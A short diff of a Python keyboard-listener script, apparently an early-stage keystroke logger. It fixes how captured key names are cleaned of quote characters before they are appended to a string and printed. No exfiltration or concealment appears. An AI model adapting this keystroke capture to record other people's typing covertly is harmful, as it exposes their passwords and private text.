@@ -20,7 +20,7 @@ def bas(key):
 	elif key == keyboard.Key.esc:
 		return False
 	else:
-		text += str(key).strip("")
+		text += str(key).strip("'")
 		print(text)
 
 with keyboard.Listener(
